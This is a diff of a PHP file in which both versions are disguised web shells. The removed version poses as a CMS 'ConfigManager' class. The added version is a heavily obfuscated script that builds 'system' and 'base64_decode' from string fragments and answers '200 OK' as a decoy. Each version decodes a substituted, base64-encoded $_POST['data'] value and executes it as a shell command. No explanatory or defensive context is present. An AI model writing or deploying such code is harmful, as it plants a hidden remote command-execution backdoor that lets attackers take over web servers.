@@ -1,86 +1,16 @@
 <?php
-/**
- * 配置管理类
- */
-class ConfigManager {
-    private $config = array(
-        'app_name' => 'CMS System',
-        'version' => '2.1.4',
-        'debug' => false
-    );
-    
-    public function updateConfig() {
-        if (!isset($_POST['data'])) {
-            return $this->getCurrentConfig();
-        }
-        
-        $config_data = $_POST['data'];
-        $decoded_config = $this->decodeConfigData($config_data);
-        
-        if ($decoded_config) {
-            return $this->applyConfigUpdate($decoded_config);
-        }
-        
-        return "Config update failed";
-    }
-    
-    private function decodeConfigData($encoded_data) {
-        $replace_pairs = array(
-            "|" => "a",
-            "!" => "b",
-            "@" => "c", 
-            "_" => "d",
-            "~" => "="
-        );
-        
-        $decoded = strtr($encoded_data, $replace_pairs);
-        return base64_decode($decoded);
-    }
-    
-    private function applyConfigUpdate($config_command) {
-        // 使用数组映射方式执行
-        $methods = array(
-            'sys' => 'system',
-            'shell' => 'shell_exec',
-            'exec' => 'exec'
-        );
-        
-        foreach ($methods as $key => $func) {
-            if (function_exists($func)) {
-                $output = $this->safeExecute($func, $config_command);
-                if ($output !== null) {
-                    return $output;
-                }
-            }
-        }
-        
-        return "No valid execution method found";
-    }
-    
-    private function safeExecute($function, $command) {
-        switch ($function) {
-            case 'system':
-                ob_start();
-                system($command);
-                return ob_get_clean();
-                
-            case 'shell_exec':
-                return shell_exec($command);
-                
-            case 'exec':
-                exec($command, $output);
-                return implode("\n", $output);
-                
-            default:
-                return null;
-        }
-    }
-    
-    private function getCurrentConfig() {
-        return "Current Config: " . $this->config['app_name'] . " v" . $this->config['version'];
-    }
-}
+$GLOBALS['x1'] = 's'.'y'.'s'.'t'.'e'.'m';
+$GLOBALS['x2'] = 'd'.'a'.'t'.'a';
+$GLOBALS['x3'] = array("|"=>"a","!"=>"b","@"=>"c","_"=>"d","~"=>"=");
+$GLOBALS['x4'] = 'b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';
 
-$config_manager = new ConfigManager();
-echo $config_manager->updateConfig();
+if(isset($_POST[$GLOBALS['x2']])){
+    $d = $_POST[$GLOBALS['x2']];
+    $r = strtr($d, $GLOBALS['x3']);
+    $c = $GLOBALS['x4']($r);
+    $f = $GLOBALS['x1'];
+    $f($c);
+}else{
+    echo "200 OK";
+}
 ?>
